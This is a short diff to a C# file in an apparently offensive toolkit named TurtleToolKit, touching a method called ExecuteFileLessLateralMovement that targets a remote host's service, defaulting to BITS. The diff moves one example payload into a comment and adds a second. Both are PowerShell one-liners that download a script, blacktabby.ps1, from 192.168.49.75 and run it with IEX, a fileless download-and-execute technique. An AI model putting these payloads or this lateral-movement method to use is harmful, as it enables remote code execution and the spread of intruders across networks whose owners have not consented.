@@ -53,7 +53,9 @@ namespace TurtleToolKit
         // Handle abnormal termination
         protected override void StopProcessing() { base.StopProcessing(); }
 
-        public static bool ExecuteFileLessLateralMovement(string targetHost, string payload , string serviceName="BITS" ) // payload example -> "c:\\windows\\system32\\cmd.exe /c c:\\windows\\system32\\WindowsPowershell\\v1.0\\powershell.exe -c `"IEX(New-Object Net.WebClient).DownloadString('http://192.168.49.75/blacktabby.ps1')`"")
+        public static bool ExecuteFileLessLateralMovement(string targetHost, string payload , string serviceName="BITS" )
+        // payload example -> "c:\\windows\\system32\\cmd.exe /c c:\\windows\\system32\\WindowsPowershell\\v1.0\\powershell.exe -c `"IEX(New-Object Net.WebClient).DownloadString('http://192.168.49.75/blacktabby.ps1')`"")
+        // payload example -> "c:\\windows\\system32\\cmd.exe /c c:\\windows\\system32\\WindowsPowershell\\v1.0\\powershell.exe -c `"`$test=((IWR -Uri 'http://192.168.49.75/blacktabby.ps1' -UseBasicParsing).RawContent);`$len=`$test.length;`$test.SubString(`$len-(`$len -198))|IEX`""
         {
             string originalBinPath = "";
             // get original bin path
